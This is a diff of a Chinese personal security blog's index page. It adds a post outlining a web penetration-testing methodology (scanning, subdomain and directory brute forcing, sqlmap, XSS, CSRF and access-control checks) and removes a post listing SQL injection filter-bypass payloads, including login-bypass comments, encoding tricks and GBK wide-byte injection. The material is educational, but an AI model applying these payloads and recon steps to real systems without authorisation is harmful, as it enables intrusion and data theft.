@@ -194,6 +194,85 @@
           
           
             
+              <a class="post-title-link" href="/2015/09/14/安全测试思路总结/" itemprop="url">
+                安全测试思路总结
+              </a>
+            
+          
+        </h1>
+      
+
+      <div class="post-meta">
+        <span class="post-time">
+          发表于
+          <time itemprop="dateCreated" datetime="2015-09-14T15:35:01+08:00" content="2015-09-14">
+            2015-09-14
+          </time>
+        </span>
+
+        
+
+        
+          
+            <span class="post-comments-count">
+              &nbsp; | &nbsp;
+              <a href="/2015/09/14/安全测试思路总结/#comments" itemprop="discussionUrl">
+                <span class="post-comments-count ds-thread-count" data-thread-key="2015/09/14/安全测试思路总结/" itemprop="commentsCount"></span>
+              </a>
+            </span>
+          
+        
+      </div>
+    </header>
+
+    <div class="post-body">
+
+      
+      
+
+      
+        
+          <span itemprop="articleBody"><p>学习安全测试也有一段时间了,零零散散的学习了一些X站姿势,也结合前一阵的测试过程,做一个测试思路的总结.</p>
+<h2 id="信息搜集:">信息搜集:</h2><p>1.可以先用Nmap扫扫<strong>端口</strong>情况,换一换不同扫描策略看看结果.<br>2.用lijiejie的subdomainbrute.py查查<strong>子域名</strong>.<br>3.用dirfuzz.py爆破<strong>目录</strong>.<br>4.AppScan探测<strong>url</strong>备用.<br>5.可以利用登录或者找回密码等页面爆破网站注册用户.<br>6.根据域名查看域名注册人信息,IP反查,搜集旁站信息…<br>7.试试域传送漏洞.</p>
+<p>总之就是尽可能的搜集信息,上面是能想到的比较重要的几点.在搜集过程中记录觉得有用的信息,例如:后台管理地址,企业邮箱入口.思路再猥琐一点,也可以搜集客服,HR或者其他一些公司公开人员信息,用于反射型XSS,CSRF,社工等用途.</p>
+<h2 id="账户体系检测">账户体系检测</h2><p>1.观察是否存在可爆破的页面,能否突破验证码,IP检测(通过修改X-Forwarded-For)等限制.<br>2.注册过程中可能出现的漏洞:任意手机注册,短信轰炸,越权绑定存在账户等问题,都需要进行排查.<br>2.修改密码功能,详情参考<a href="http://quanyong.xyz/2015/08/07/%E5%AF%86%E7%A0%81%E6%89%BE%E5%9B%9E%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" target="_blank" rel="external">密码找回漏洞总结</a></p>
+<h2 id="SQL注入检测">SQL注入检测</h2><p>1.将AppScan探测到的url存为txt文件.<br>2.使用sqlmap -m 参数进行批量扫描.<br>3.选取可疑url进行手工测试,尝试不同绕过.</p>
+<h2 id="XSS检测">XSS检测</h2><p>1.使用chrome的XSS检测插件进行检测:将<strong>检测目标</strong>和<strong>payload</strong>添加至指定位置.<br>2.选取一些大范围使用以及可能造成存储型XSS的参数进行验证.<br>3.查看\”&gt;&amp;/等字符的过滤情况.</p>
+<h2 id="CSRF检测">CSRF检测</h2><p>1.截获请求,观察其中有无类似防止csrf攻击的参数.<br>2.修改refer继续请求.<br>3.如果请求被正常返回,构造csrf攻击页面,通过点击访问进行验证.</p>
+<h2 id="越权漏洞检测">越权漏洞检测</h2><p>1.注册两个账号,分别用chrome和火狐登录.<br>2.通过替换参数检测越权,通常是 id,uid,username等参数.<br>3.如果有条件同时检测<strong>平行越权</strong>和<strong>垂直越权</strong>.</p>
+<h2 id="历史漏洞排查">历史漏洞排查</h2><p>1.如果产品曾经爆出历史漏洞,可单独列出此项.<br>2.根据历史漏洞进行排查,验证修复情况.</p>
+<h2 id="工具扫描结果">工具扫描结果</h2><p>1.AppScan 目前只用过这个,针对扫描结果进行验证,给出分析建议.<br>2.通常是一些敏感信息泄露:电话,邮箱,内网IP等<br>3.使用HTTPS协议,密码不能自动补全,httponly限制js操作cookie.</p>
+<h2 id="测试总结">测试总结</h2><p>1.列举测试过程中发现的问题,并简述修复建议.<br>2.简要评估网站安全.</p>
+</span>
+        
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <header class="post-header">
+
+      
+      
+        <h1 class="post-title" itemprop="name headline">
+          
+          
+            
               <a class="post-title-link" href="/2015/09/06/shell命令使用记录/" itemprop="url">
                 shell命令使用记录
               </a>
@@ -947,14 +1026,7 @@ php+apache : id = <span class="number">3</span>
 
       
         
-          <span itemprop="articleBody"><h2 id="查看当前活动代码页（默认编码格式）">查看当前活动代码页（默认编码格式）</h2><pre><code><span class="built_in">cmd</span>&gt; <span class="built_in">chcp</span>
-//活动代码页为：<span class="number">936</span>，它对于的编码格式为GBK
-</code></pre><h2 id="设置当前cmd窗口标题">设置当前cmd窗口标题</h2><pre><code><span class="built_in">cmd</span>&gt; <span class="built_in">title</span> Hello Mr.Q
-</code></pre><h2 id="添加删除程序">添加删除程序</h2><pre><code><span class="tag">cmd</span>&gt; <span class="tag">appwiz</span><span class="class">.cpl</span>
-</code></pre><h2 id="启动计算器">启动计算器</h2><pre><code><span class="built_ins">cmd</span>&gt; calc
-</code></pre><h2 id="事件查看器">事件查看器</h2><pre><code><span class="built_ins">cmd</span>&gt; eventvwr
-</code></pre><h2 id="查看系统配置">查看系统配置</h2><pre><code><span class="built_ins">cmd</span>&gt; msinfo32
-</code></pre><h2 id="注册表编辑器">注册表编辑器</h2><pre><code><span class="built_ins">cmd</span>&gt; regedit
+          <span itemprop="articleBody"><h2 id="启动计算器">启动计算器</h2><pre><code><span class="built_ins">cmd</span>&gt; calc
 </code></pre><h2 id="用户操作">用户操作</h2><pre><code><span class="built_ins">cmd</span>&gt; net <span class="built_ins">user</span>
 //查看现有账户
 <span class="built_ins">cmd</span>&gt; net <span class="built_ins">user</span> admin
@@ -1454,157 +1526,6 @@ mysql&gt; <span class="keyword">select</span>@^<span class="number">1.</span><sp
 
 
     
-      
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      
-      
-        <h1 class="post-title" itemprop="name headline">
-          
-          
-            
-              <a class="post-title-link" href="/2015/08/17/SQL注入练级攻略-6-基本绕过-一/" itemprop="url">
-                SQL注入练级攻略(6)-绕过姿势(一)
-              </a>
-            
-          
-        </h1>
-      
-
-      <div class="post-meta">
-        <span class="post-time">
-          发表于
-          <time itemprop="dateCreated" datetime="2015-08-17T10:02:47+08:00" content="2015-08-17">
-            2015-08-17
-          </time>
-        </span>
-
-        
-          <span class="post-category" >
-            &nbsp; | &nbsp; 分类于
-            
-              <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                <a href="/categories/SLQ注入练级系列/" itemprop="url" rel="index">
-                  <span itemprop="name">SLQ注入练级系列</span>
-                </a>
-              </span>
-
-              
-              
-
-            
-          </span>
-        
-
-        
-          
-            <span class="post-comments-count">
-              &nbsp; | &nbsp;
-              <a href="/2015/08/17/SQL注入练级攻略-6-基本绕过-一/#comments" itemprop="discussionUrl">
-                <span class="post-comments-count ds-thread-count" data-thread-key="2015/08/17/SQL注入练级攻略-6-基本绕过-一/" itemprop="commentsCount"></span>
-              </a>
-            </span>
-          
-        
-      </div>
-    </header>
-
-    <div class="post-body">
-
-      
-      
-
-      
-        
-          <span itemprop="articleBody"><h2 id="关于引号">关于引号</h2><p>在SQL语句中可以使用很多引号  “ 还是 ‘ 只要是成对出现后面的语句可以继续执行</p>
-<pre><code>mysql&gt; <span class="keyword">select</span> username<span class="string">""</span><span class="string">"''''"</span> <span class="keyword">from</span> admin <span class="keyword">where</span> id = <span class="string">"1"</span><span class="string">''</span>;
-</code></pre><h2 id="关于注释">关于注释</h2><p>可在命令行注释语句的符号</p>
-<table>
-<thead>
-<tr>
-<th style="text-align:center">符号</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:center"><code>#</code></td>
-<td>hash语法</td>
-</tr>
-<tr>
-<td style="text-align:center"><code>/*</code></td>
-<td>C-sytle</td>
-</tr>
-<tr>
-<td style="text-align:center"><code>-- -</code></td>
-<td>SQL语法</td>
-</tr>
-<tr>
-<td style="text-align:center"><code>;%00</code></td>
-<td>空字节</td>
-</tr>
-<tr>
-<td style="text-align:center">```</td>
-<td>反引号</td>
-</tr>
-</tbody>
-</table>
-<pre><code>mysql&gt; <span class="keyword">select</span> id <span class="keyword">from</span> admin <span class="keyword">where</span> username = <span class="string">"admin"</span> and password = <span class="string">'123456'</span>; <span class="comment">//正常的语句</span>
-mysql&gt; <span class="keyword">select</span> id <span class="keyword">from</span> admin <span class="keyword">where</span> username = <span class="string">"admin"</span>;<span class="preprocessor">#" and password = '123456';//构造后的语句这样不经过and后的验证直接返回符合的id</span>
-</code></pre><h2 id="绕过引号">绕过引号</h2><pre><code>mysql&gt; select * from user where user = <span class="number">0x61646D696E</span> ; 
-<span class="comment">// 在python解释器中 "admin".encode("hex") 显示 61646D696E</span>
-mysql&gt; select * from user where user = <span class="keyword">char</span>(<span class="number">97</span>,<span class="number">100</span>,<span class="number">109</span>,<span class="number">105</span>,<span class="number">110</span>);
-<span class="comment">// 利用char函数.</span>
-</code></pre><h2 id="绕过字符串黑名单">绕过字符串黑名单</h2><pre><code>mysql&gt; <span class="keyword">select</span> <span class="string">'a'</span><span class="string">'d'</span><span class="string">'mi'</span><span class="string">'n'</span>;
-mysql&gt; <span class="function"><span class="keyword">select</span> <span class="title">concat</span>(<span class="params"><span class="string">'a'</span>,<span class="string">'d'</span>,<span class="string">'m'</span>,<span class="string">'i'</span>,<span class="string">'n'</span></span>)</span>;<span class="comment">//当有一参数为null返回null</span>
-mysql&gt; <span class="function"><span class="keyword">select</span> <span class="title">concat_ws</span>(<span class="params"><span class="string">''</span>,<span class="string">'a'</span>,<span class="string">'d'</span>,<span class="string">'m'</span>,<span class="string">'i'</span>,<span class="string">'n'</span></span>)</span>;<span class="comment">// 推荐使用</span>
-mysql&gt; <span class="function">SELECT <span class="title">GROUP_CONCAT</span>(<span class="params"><span class="string">'a'</span>, <span class="string">'d'</span>, <span class="string">'m'</span>, <span class="string">'i'</span>, <span class="string">'n'</span></span>)</span>;
-</code></pre><h2 id="绕过空格">绕过空格</h2><pre><code>mysql&gt; /*!<span class="keyword">select</span>/*!<span class="number">1</span>/*!*/
-<span class="comment">// /*! SQL 语句 */ mysql特有语句，前面不管几个/*!  语句需以*/结尾.</span>
-mysql&gt; <span class="keyword">select</span>(<span class="number">1</span>);
-<span class="comment">//括号用来绕过过滤空格的情况.</span>
-mysql&gt; <span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> admin <span class="built_in">where</span> username = <span class="string">"quan"</span><span class="built_in">and</span>!!<span class="number">1</span>=<span class="number">1</span>;
-<span class="comment">//在and/or之后使用 ！ ~ 代替空格如果注入参数是字符型则and前面的空格可以省略。</span>
-</code></pre><h2 id="and或or后面可以跟的字符">and或or后面可以跟的字符</h2><p><strong>符号: Space , + , - , ~ , ! , @ </strong></p>
-<pre><code>mysql&gt; SELECT <span class="number">1</span> FROM dual WHERE <span class="number">1</span>=<span class="number">1</span> AND-+-+-+-+~~((<span class="number">1</span>));
-</code></pre><h2 id="Where后条件的各种转换姿势">Where后条件的各种转换姿势</h2><pre><code> <span class="string">' or "a"='</span>a<span class="string">'
-'</span> <span class="keyword">or</span> <span class="string">'a'</span>=n<span class="string">'a'</span>               <span class="comment">//unicode</span>
-<span class="string">' or '</span>a<span class="string">'=b'</span><span class="number">1100001</span><span class="string">'         //binary
-'</span> <span class="keyword">or</span> <span class="string">'a'</span>=x<span class="string">'61'</span>              <span class="comment">//16进制</span>
-<span class="string">' or 1=true #true=1, false=0
-'</span> <span class="keyword">or</span> <span class="number">1</span> #<span class="keyword">true</span>
-<span class="string">' or version()=5.5 #5.5.41-log
-'</span> <span class="keyword">or</span> round(pi(),<span class="number">1</span>)+<span class="keyword">true</span>+<span class="keyword">true</span>+<span class="number">0.4</span>=version() <span class="string">#3</span>.<span class="number">1</span>+<span class="number">1</span>+<span class="number">1</span>+<span class="number">0.4</span>
-<span class="keyword">select</span> * <span class="keyword">from</span> users <span class="keyword">where</span> <span class="string">'a'</span>=<span class="string">'b'</span>=<span class="string">'c'</span>
-<span class="keyword">select</span> * <span class="keyword">from</span> users <span class="keyword">where</span> (<span class="string">'a'</span>=<span class="string">'b'</span>)=<span class="string">'c'</span>
-<span class="keyword">select</span> * <span class="keyword">from</span> users <span class="keyword">where</span> (<span class="keyword">false</span>)=<span class="string">'c'</span>
-<span class="keyword">select</span> * <span class="keyword">from</span> users <span class="keyword">where</span> (<span class="number">0</span>)=<span class="string">'c'</span>
-<span class="keyword">select</span> * <span class="keyword">from</span> users <span class="keyword">where</span> (<span class="number">0</span>)=<span class="number">0</span>
-<span class="keyword">select</span> * <span class="keyword">from</span> users <span class="keyword">where</span> <span class="keyword">true</span>
-<span class="keyword">select</span> * <span class="keyword">from</span> users
-</code></pre><h2 id="宽字节注入">宽字节注入</h2><p>sql注入中的宽字节国内最常使用的gbk编码，这种方式主要是绕过addslashes等对特殊字符进行转移的绕过。反斜杠()的十六进制为%5c，在你输入%bf%27时，函数遇到单引号自动转移加入\，此时变为%bf%5c%27，%bf%5c在gbk中变为一个宽字符“縗”。%bf那个位置可以是%81-%fe中间的任何字符。不止在sql注入中，宽字符注入在很多地方都可以应用。</p>
-<p><a href="http://drops.wooyun.org/tips/123" target="_blank" rel="external">摘自乌云知识库</a></p>
-</span>
-        
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -1643,7 +1564,7 @@ mysql&gt; <span class="keyword">select</span> <span class="number">1</span> <spa
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">52</span>
+              <span class="site-state-item-count">53</span>
               <span class="site-state-item-name">日志</span>
             </a>
           </div>
